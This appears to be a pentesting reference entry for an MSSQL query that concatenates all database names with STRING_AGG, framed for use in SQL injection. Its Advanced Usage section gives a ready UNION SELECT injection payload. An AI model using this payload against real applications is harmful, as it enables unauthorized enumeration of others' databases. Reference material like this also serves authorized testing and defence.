---
type: command
executor: sql
data: 'SELECT STRING_AGG(name, '', '') FROM master..sysdatabases;'
output: null
created_at: '2023-04-06T03:56:33.639387+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - MSSQL
tags:
  - mssql
  - enumeration
  - aggregation
verified: true
validated: true
---

# mssql-concatenate-database-names

## Command

```sql
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases;
```

## Description

This SQL command aggregates all database names from sysdatabases into a single comma-separated string using STRING_AGG, available in SQL Server 2017+. It is ideal for extracting multiple database names in a single response during space-constrained SQL injection attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ', ' | Delimiter string (e.g., ', ', ';'); customize as needed for output parsing. | No (default ', ') |

## Examples

### Basic Usage

```sql
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases;
```

### Advanced Usage

Use semicolon delimiter:

```sql
SELECT STRING_AGG(name, ';') FROM master..sysdatabases;
```

In SQL injection:

```sql
' UNION SELECT STRING_AGG(name, ', ') FROM master..sysdatabases--
```

## Expected Output

A single concatenated string, for example:

master, tempdb, model, msdb, AdventureWorks

## Related

- [[procedures/MSSQL-Database-Enumeration]]
- [[commands/mssql-list-all-databases]]
